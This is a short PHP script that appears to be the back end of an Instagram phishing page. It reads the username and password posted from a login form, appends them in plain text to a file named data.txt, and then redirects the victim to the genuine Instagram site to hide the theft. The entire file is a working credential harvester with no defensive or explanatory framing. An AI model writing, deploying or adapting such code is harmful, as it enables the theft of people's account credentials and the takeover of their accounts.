<?php

$username = $_POST['username'];
$password = $_POST['password'];


$file = fopen("data.txt", "a");
fwrite($file, "Username: $username\nPassword: $password\n\n");
fclose($file);


header("Location: https://www.instagram.com/");
exit();
?>
